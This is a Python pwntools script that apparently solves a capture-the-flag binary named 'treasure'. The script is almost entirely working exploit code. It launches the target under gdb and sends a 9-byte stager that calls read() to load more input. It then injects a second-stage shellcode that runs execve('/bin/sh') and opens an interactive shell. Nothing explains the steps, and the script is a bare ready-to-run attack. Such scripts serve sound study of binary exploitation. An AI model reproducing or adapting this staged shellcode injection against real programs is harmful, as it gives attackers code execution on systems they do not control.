#!/usr/bin/env python
from pwn import *
context.arch='amd64'
p=process('./treasure')
context.log_level='debug'
gdb.attach(p,'b *0x400AB6\nb *0x400aae\nb *0x400AA3')

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

ru("will you continue?(enter 'n' to quit) :")

sl('\x90')
p.recvuntil('start!!!!')

shellcode='mov rsi,rdx;'+'mov rdx,r10;syscall'                    # read(0,rsp,100)
shellcode=asm(shellcode).ljust(9,'\x90')

# payload='\x31\xff\x48\x89\xd6\x89\xe2\x0f\x05'
# sd(payload)
sd(shellcode)


payload="mov rax,59;mov rbx,0x68732f6e69622f;push rbx;mov rdi,rsp;xor esi,esi;"
payload+="xor edx,edx;syscall"
shellcode_2='\x90'*10+asm(payload)

p.sendline(shellcode_2)

#p.send('a'*10)



p.interactive()